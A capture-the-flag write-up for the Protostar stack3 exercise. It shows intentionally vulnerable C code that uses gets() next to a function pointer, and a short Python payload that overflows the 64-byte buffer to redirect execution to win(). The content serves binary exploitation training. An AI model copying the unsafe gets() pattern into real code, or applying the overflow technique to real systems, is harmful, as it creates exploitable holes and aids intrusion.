# Stack3 Challenge

If you have read the writeups on the previous two challenges this challenge shouldn't be too hard. This is why the solution is not that analytical.

You can find the source code <a href="https://exploit-exercises.lains.space/protostar/stack3/">here</a>.

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

As you can see we basically have a function pointer called **fp** that we have to set to the right value so when execution reaches the command `fp()` , the `win()` function will be executed.

Let's take a look at the disassembled code

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack3/images/disas_st2.png">

 Based on knowledge acquired by the previous challenges we can see that our buffer starts at **esp+0x1c** and is **64** bytes long so it theoritically stops at **esp+0x5c**, exactly next to where **fp** is stored initially. 
 
 Therefore, we will need **64** bytes of padding to reach fp on the **stack** and then **4** more to _overwrite_ it.
 
We have to find out exactly where the function `win()` resides in memory and we can do so with   
<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack3/images/xwin.png">

Now let's create a simple python script

```python

#!/usr/bin/env python
from struct import pack

prepend = b"A"*64
prepend += pack("<L",0x8048424)
print prepend
```

Confirm

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack3/images/conf3.png">

### Success!

